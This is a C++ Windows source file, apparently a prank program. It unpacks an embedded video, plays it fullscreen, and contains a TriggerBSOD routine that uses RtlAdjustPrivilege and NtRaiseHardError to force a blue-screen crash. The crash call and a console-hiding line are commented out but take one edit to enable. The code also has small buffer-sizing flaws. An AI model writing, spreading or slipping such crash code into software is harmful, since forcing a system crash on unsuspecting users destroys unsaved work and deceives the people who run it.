#include <windows.h>
#include <dshow.h>
#include <stdio.h>

// pragmas for libraries needed
#pragma comment(lib, "ntdll.lib") 		// bsod stuff
#pragma comment(lib, "strmiids.lib") 	// most of directshow
#pragma comment(lib, "ole32.lib") 		// CoInitialize and CoCreateInstance
#pragma comment(lib, "user32.lib")		// ShowWindow

// externs for bsod stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

// global variables for directshow
IGraphBuilder*	graph = 0; 		// filter graph manager
IMediaControl*	control = 0; 	// media control interface
IMediaEvent*	event = 0; 		// media event interface
IVideoWindow*	window = 0;		// the video window

// helper functions
void GetVideoResource(WCHAR** path) {
	// get the video resource data
	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
	HGLOBAL handle = LoadResource(NULL, resource);

	DWORD size = SizeofResource(NULL, resource);
	LPVOID data = LockResource(handle);

	// fill up a temporary file with the video data
	GetTempPathW(MAX_PATH, *path);	
	StringCbCatW(*path, MAX_PATH, L"video.wmv");

	HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	WriteFile(file, data, size, NULL, NULL);
	CloseHandle(file);
}

void InitializeDirectShow(WCHAR** path) {
	// create the filter graph manager
	HRESULT result = CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);

	if (FAILED(result)) {
		printf("error! code 0x%x\n", result);
	}

	// get all needed addition interfaces
	graph->QueryInterface(IID_IMediaControl, (void**)&control);
	graph->QueryInterface(IID_IMediaEvent, (void**)&event);
	graph->QueryInterface(IID_IVideoWindow, (void**)&window);

	// attempt to build the graph for file playback
	graph->RenderFile(*path, NULL);

	// set the video window to fullscreen mode
	window->put_FullScreenMode(OATRUE);
}

ULONG TriggerBSOD() {
	BOOLEAN state;
	ULONG response;

	RtlAdjustPrivilege(19, TRUE, FALSE, &state); // adjust privileges to allow raising BSoD
	NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &response); // raise BSoD

	return response;
}

// main function
int main() {
	WCHAR* path = (WCHAR*)malloc(MAX_PATH);

	HRESULT result;
	LONG code;

	CoInitialize(NULL); // initialize COM
	//ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
	
	GetVideoResource(&path); // get the video resource
	InitializeDirectShow(&path); // initialize directshow stuff

	result = control->Run(); // play the video

	if (SUCCEEDED(result)) {
		event->WaitForCompletion(INFINITE, &code); // wait for video to finish
	}

	// trigger the blue screen of death
	//TriggerBSOD();

	// if it gets here, the BSoD failed :(
	return 1;
}